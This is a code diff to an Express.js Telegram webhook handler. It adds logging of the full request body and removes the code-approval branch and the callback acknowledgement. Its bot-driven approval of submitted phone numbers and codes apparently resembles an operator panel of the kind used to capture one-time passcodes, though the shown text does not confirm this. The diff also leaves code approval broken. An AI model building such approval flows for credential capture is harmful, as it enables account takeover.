@@ -121,6 +121,9 @@ app.get('/check-code/:id', (req, res) => {
 
 // ---------------- WEBHOOK ----------------
 app.post('/telegram-webhook/:botId', async (req, res) => {
+    console.log("WEBHOOK HIT");
+    console.log(JSON.stringify(req.body, null, 2));
+
     const bot = getBot(req.params.botId);
     if (!bot) return res.sendStatus(404);
 
@@ -129,20 +132,12 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
 
     const [action, type, requestId] = cb.data.split(':');
 
+    console.log(action, type, requestId);
+
     if (type === 'phone') {
         phoneStatus[requestId] = action === 'approve';
+        console.log("PHONE UPDATED:", requestId, phoneStatus[requestId]);
     }
-
-    if (type === 'code') {
-        codeStatus[requestId] = action === 'approve';
-    }
-
-    try {
-        await axios.post(
-            `https://api.telegram.org/bot${bot.botToken}/answerCallbackQuery`,
-            { callback_query_id: cb.id }
-        );
-    } catch (e) {}
 
     res.sendStatus(200);
 });
